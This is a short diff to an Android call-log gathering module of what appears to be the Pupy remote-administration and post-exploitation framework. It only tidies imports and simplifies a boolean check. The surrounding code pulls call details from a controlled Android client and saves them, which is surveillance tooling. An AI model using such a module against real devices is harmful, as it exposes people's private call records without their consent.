@@ -5,7 +5,8 @@
 __class_name__="call"
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
-import os, datetime
+import os
+import datetime
 
 @config(cat="gather", compat=["android"])
 class call(PupyModule):
@@ -25,7 +26,7 @@ class call(PupyModule):
         self.client.load_package("pupydroid.utils")
         self.client.load_package("pupydroid.call")
         path = getLocalAndroidPath(self.client, args)
-        if args.get_all==True:
+        if args.get_all:
             self.success("Getting call details...")
             callDetails = self.client.conn.modules['pupydroid.call'].getCallDetails()
             self.success("{0} call details got. Saving...".format(len(callDetails)))
